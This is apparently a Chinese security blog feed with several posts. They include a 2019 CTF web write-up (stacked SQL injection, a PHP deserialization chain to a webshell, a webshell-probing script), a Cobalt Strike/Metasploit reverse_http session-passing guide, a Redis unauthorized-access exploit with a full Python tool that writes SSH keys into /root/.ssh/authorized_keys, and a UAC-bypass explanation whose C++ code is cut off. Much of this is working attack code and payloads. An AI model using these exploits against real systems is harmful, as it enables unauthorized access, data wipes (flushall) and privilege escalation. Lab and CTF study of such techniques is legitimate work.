class="line">http:&#x2F;&#x2F;cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun&#x2F;1.php?1&#x3D;system(%22cat%20&#x2F;flag%22); </span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/671mWT"><img src="https://z3.ax1x.com/2021/03/23/671mWT.md.png" alt="671mWT.md.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2019强网杯web部分复现</title>
    <link href="/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>堆叠注入</p><p>测试时发现过滤了一些函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAXY8.png" alt="6dAXY8.png"></p><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases #</span><br></pre></td></tr></table></figure><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAqTP.png" alt="6dAqTP.png"></p><p>查看表名，发现两张表</p><p>1919810931114514</p><p>words</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show tables from supersqli #</span><br></pre></td></tr></table></figure><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAqTP.png" alt="6dAqTP.png"></p><p>表1919810931114514中存在flag字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAjfS.png" alt="6dAjfS.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>使用handler绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;handler &#96;1919810931114514&#96;close #</span><br></pre></td></tr></table></figure><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAzlQ.png" alt="6dAzlQ.png"></p><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>反序列化</p><p>注册用户</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAoyd.png" alt="6dAoyd.png"></p><p>进入后发现可以上传图片</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAbwt.png" alt="6dAbwt.png"></p><p>下载备份文件<a href="http://www.tar.gz/">www.tar.gz</a></p><p>在cookie处发现序列化后的字符串，推测是要利用反序列化。</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAfJO.png" alt="6dAfJO.png"></p><p>全局搜索unserialize，定位到/web/controller/Index.php,从cookie中获取basse64编码后的user值然后进行反序列化</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dA2o6.png" alt="6dA2o6.png"></p><p>/web/controller/Profile.php的Profile类中调用了copy函数，可以重命名文件。$this-&gt;filename_tmp和$this-&gt;filename均可控，可以结合上传图片功能，调用upload_img方法将上传后的图片文件命名为php文件，直接getshell。</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAWFK.png" alt="6dAWFK.png"></p><p>/web/controller/Register.php中的Register类存在__destruct方法，只要把checker赋值为Profile类即可触发<code>__call</code>方法</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAgdx.png" alt="6dAgdx.png"></p><p>Profile类中存在<code>__call方法和__get方法</code>，<code>__call</code>方法中存在调用函数的可能，函数名为$this-&gt;{$this-&gt;{$name}}，进入<code>__call</code>方法后$this-&gt;index访问不存在的属性，从而调用<code>__get</code>方法，我们可以在<code>__get</code>方法中把$this-&gt;index赋值为upload_img，这样<code>__call</code>中即可调用upload_img。except属性可控，令except属性等于 array(‘index’ =&gt; ‘upload_img’)，这样$this-&gt;{$this-&gt;{$name}}就会等于$this-&gt;index等于upload_img，从而能在<code>__call</code>方法中调用upload_img函数</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAce1.png" alt="6dAce1.png"></p><h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><p>Register类中的<code>__destruct()</code>方法-&gt;Profile类中的<code>__call()</code>方法-&gt;Profile类中的<code>__get()</code>方法-&gt;Profile类中的upload_img()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/30a17ed2359586e474712c283fa27ffb.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/111.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Register(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="variable">$b</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上传图片马</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAhWD.png" alt="6dAhWD.png"></p><p>在cookie的user参数中写入payload</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAIQH.png" alt="6dAIQH.png"></p><p>改名成功</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dA5Se.png" alt="6dA5Se.png"></p><h1 id="smarthacker"><a href="#smarthacker" class="headerlink" title="smarthacker"></a>smarthacker</h1><p>脚本编写</p><p>直接下载备份文件开始分析</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dATOA.png" alt="6dATOA.png"></p><p>打开后发现大量疑似webshell，但是大都无法利用，由于数量高达3000个，逐个分析是不可能的，因此只能利用python脚本构造请求测试webshell中的参数是否可用</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dAOFf.png" alt="6dAOFf.png"></p><p>编写脚本测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">patternget=re.<span class="built_in">compile</span>(<span class="string">&quot;GET\[\&#x27;(.+?)\&#x27;\]&quot;</span>)</span><br><span class="line">patternpost=re.<span class="built_in">compile</span>(<span class="string">&quot;POST\[\&#x27;(.+?)\&#x27;\]&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;D:\phpstudy_pro\WWW\ctf\src&#x27;</span>)</span><br><span class="line">files=os.listdir(<span class="string">&#x27;D:\phpstudy_pro\WWW\ctf\src&#x27;</span>)</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span></span><br><span class="line">webshellname=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        print(filename)</span><br><span class="line">        index=<span class="number">11</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            result=patternget.findall(<span class="built_in">str</span>(f.read()))</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">for</span> arg <span class="keyword">in</span> result:</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">                url=<span class="string">&#x27;http://127.0.0.1/ctf/src/%s?%s=echo 955682789;&#x27;</span> %(filename,arg)</span><br><span class="line">                r=session.get(url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;955682789&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg))</span><br><span class="line">                    webshellname=<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        print(filename)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            result=patternpost.findall(<span class="built_in">str</span>(f.read()))</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">for</span> arg <span class="keyword">in</span> result:</span><br><span class="line">                url=<span class="string">&#x27;http://127.0.0.1/ctf/src/%s&#x27;</span> %filename</span><br><span class="line">                data=&#123;arg:<span class="string">&#x27;echo 955682789;&#x27;</span>&#125;</span><br><span class="line">                r=session.post(url=url,data=data)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;955682789&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg))</span><br><span class="line">                    webshellname=<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#post()</span></span><br><span class="line">    get()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到flag</p><p>[<img src="https://s3.ax1x.com/2021/03/13/6dESyj.png" alt="6dESyj.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>msf和cs联动</title>
    <link href="/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/"/>
    <url>/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="cs派生给msf"><a href="#cs派生给msf" class="headerlink" title="cs派生给msf"></a>cs派生给msf</h2><p>配置好listener，选择Foreign HTTP</p><p><a href="https://imgtu.com/i/6Y5Nxx"><img src="https://s3.ax1x.com/2021/03/11/6Y5Nxx.png" alt="6Y5Nxx.png"></a></p><p>使用cs的spawn功能</p><p><a href="https://imgtu.com/i/6Y5tR1"><img src="https://s3.ax1x.com/2021/03/11/6Y5tR1.png" alt="6Y5tR1.png"></a></p><p>msf设置payload为/windows/meterpreter/reverse_http，ip和端口与listener中的一致，不要使用64位的payload，会出现问题。这样即可接收到派生过来的session</p><p><a href="https://imgtu.com/i/6Y5YGR"><img src="https://s3.ax1x.com/2021/03/11/6Y5YGR.png" alt="6Y5YGR.png"></a></p><h2 id="msf派生给cs"><a href="#msf派生给cs" class="headerlink" title="msf派生给cs"></a>msf派生给cs</h2><p>只有meterpreter类型的session才能派生给cs</p><p>使用msf中的windows/local/payload_inject模块，设置payload为windows/meterpreter/reverse_http，ip和端口填写cs监听的ip和端口，再指定。设置iDisablePayloadHandler为true，因为payload_inject执行后会产生一个新的handler，但是我们已经有了一个，所以不需要它。执行后即可再cs中看到上线的机器。</p><p><a href="https://imgtu.com/i/6Y5Ji9"><img src="https://s3.ax1x.com/2021/03/11/6Y5Ji9.png" alt="6Y5Ji9.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python编写Redis漏洞检测和利用脚本</title>
    <link href="/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
    <url>/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="python编写Redis漏洞检测和利用脚本"><a href="#python编写Redis漏洞检测和利用脚本" class="headerlink" title="python编写Redis漏洞检测和利用脚本"></a>python编写Redis漏洞检测和利用脚本</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-6.0.8.tar.gz</span><br><span class="line"># tar xzf redis-6.0.8.tar.gz</span><br><span class="line"># cd redis-6.0.8</span><br><span class="line"># make</span><br></pre></td></tr></table></figure><p>执行完 make 命令后，redis-6.0.8 的 src 目录下会出现编译后的 redis 服务程序 redis-server，还有用于测试的客户端程序 redis-cli：</p><p>下面启动 redis 服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd src</span><br><span class="line"># .&#x2F;redis-server</span><br></pre></td></tr></table></figure><p>修改redis.conf，先注释掉bind 127.0.0.1这一行，允许远程登陆，同时关闭保护模式</p><p><a href="https://imgtu.com/i/6nJBwD"><img src="https://s3.ax1x.com/2021/03/06/6nJBwD.png" alt="6nJBwD.png"></a></p><p><a href="https://imgtu.com/i/6nJDTe"><img src="https://s3.ax1x.com/2021/03/06/6nJDTe.png" alt="6nJDTe.png"></a></p><p>使用修改后的配置文件启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd src</span><br><span class="line"># .&#x2F;redis-server ..&#x2F;redis.conf</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6nJ6fA"><img src="https://s3.ax1x.com/2021/03/06/6nJ6fA.png" alt="6nJ6fA.png"></a></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>修改数据库默认路径为/root/.ssh，默认缓存文件为authorized.keys，把目标主机缓存的公钥作为value保存在authorized.keys文件中，这样就在服务器端/root/.ssh下生成了一个授权的key</p><p>1.本地主机生成密钥key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6nJdOK"><img src="https://s3.ax1x.com/2021/03/06/6nJdOK.png" alt="6nJdOK.png"></a></p><p>2.在目录/root/.ssh下查看生成结果，并把公钥导入txt文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;.ssh</span><br><span class="line">ls</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat key.txt</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6nJ0eO"><img src="https://s3.ax1x.com/2021/03/06/6nJ0eO.png" alt="6nJ0eO.png"></a></p><p>3.把生成的公钥导入Redis缓存中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;key.txt | redis-cli -h xx.xx.xx.xx</span><br></pre></td></tr></table></figure><p>4.连接到目标主机，更改配置文件路径为/root/.ssh，设置文件名称为authorized-keys</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xx.xx.xx.xx</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">Config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>5.ssh连接到目标主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh xx.xx.xx.xx</span><br></pre></td></tr></table></figure><h2 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h2><p>github地址：<a href="https://github.com/sp4zcmd/SimpleRedisScanner">https://github.com/sp4zcmd/SimpleRedisScanner</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Usage</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;RedisScanner.py 127.0.0.1 key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Scan</span>(<span class="params">ip</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip, <span class="number">6379</span>))</span><br><span class="line">        s.sendall(payload.encode())</span><br><span class="line">        recvdata=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;redis_version&#x27;</span> <span class="keyword">in</span> recvdata:</span><br><span class="line">            print(<span class="string">&#x27;[+] %s is vulnerable &#x27;</span> %ip)</span><br><span class="line">            <span class="comment">#print(recvdata)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-] %s is not vulnerable &#x27;</span> %ip)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WriteSSHKeygen</span>(<span class="params">ip,sshkey</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = redis.StrictRedis(host=ip, port=<span class="number">6379</span>, db=<span class="number">0</span>, socket_timeout=<span class="number">2</span>)</span><br><span class="line">        r.flushall()</span><br><span class="line">        r.<span class="built_in">set</span>(<span class="string">&#x27;crackit&#x27;</span>, sshkey)</span><br><span class="line">        r.config_set(<span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;/root/.ssh/&#x27;</span>)</span><br><span class="line">        r.config_set(<span class="string">&#x27;dbfilename&#x27;</span>, <span class="string">&#x27;authorized_keys&#x27;</span>)</span><br><span class="line">        r.save()</span><br><span class="line">        print(<span class="string">&#x27;[+] Write SSHkeygen successful&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-] Write SSHkeygen Failed&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv)==<span class="number">3</span>):</span><br><span class="line">        ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">        sshkeyfile=sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(sshkeyfile, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                sshkey = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&#x27;Read SSHkeygen Failed&#x27;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Scan(ip):</span><br><span class="line">            WriteSSHKeygen(ip, sshkey)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Usage()</span><br></pre></td></tr></table></figure><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p><a href="https://imgtu.com/i/6nJay6"><img src="https://s3.ax1x.com/2021/03/06/6nJay6.png" alt="6nJay6.png"></a></p><p>写入成功</p><p><a href="https://imgtu.com/i/6nJgSI"><img src="https://s3.ax1x.com/2021/03/06/6nJgSI.png" alt="6nJgSI.png"></a></p><p>成功连接</p><p><a href="https://imgtu.com/i/6nJ2lt"><img src="https://s3.ax1x.com/2021/03/06/6nJ2lt.png" alt="6nJ2lt.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>基于COM组件接口的BypassUAC</title>
    <link href="/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/"/>
    <url>/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/</url>
    
    <content type="html"><![CDATA[<p>COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以此提升COM接口权限。其中，ICMLuaUtil接口提供了ShellExec方法执行命令，创建指定进程。</p><p>原理是利用COM提升名称以高权限调用ICMLuaUtil接口，从而以高权限执行ShellExec创建指定进程。使用权限提升COM类的程序必须通过调用CoCreateInstanceAsAdmin函数创建COM类，必须用可信程序运行，如果执行COM提升名称代码的程序身份不可信，则会触发UAC，要Bypass UAC必须让这一段代码在Windows的可信程序中运行，如记事本、计算器、rundll32.exe等，通过DLL注入或是劫持技术，将这段代码注入到这些可欣程序的进程空间中。通过rundll32.exe调用自定义DLL中的导出函数，执行COM提升名称的代码。</p><h1 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h1><p>初始化com库-&gt;创建高权限的ICMLuaUtil接口-&gt;调用ICMLuaUtil的ShellExec方法-&gt;以高权限执行cmd</p><p>实质上是以高权限运行COM组件ICMLuaUtil,ICMLuaUtil中可调用ShellExecute执行程序。定义成导出函数，用可信程序rundll32调用导出函数</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BypassUAC.h&quot;</span></span></span><br><span class="line"></span><br><span 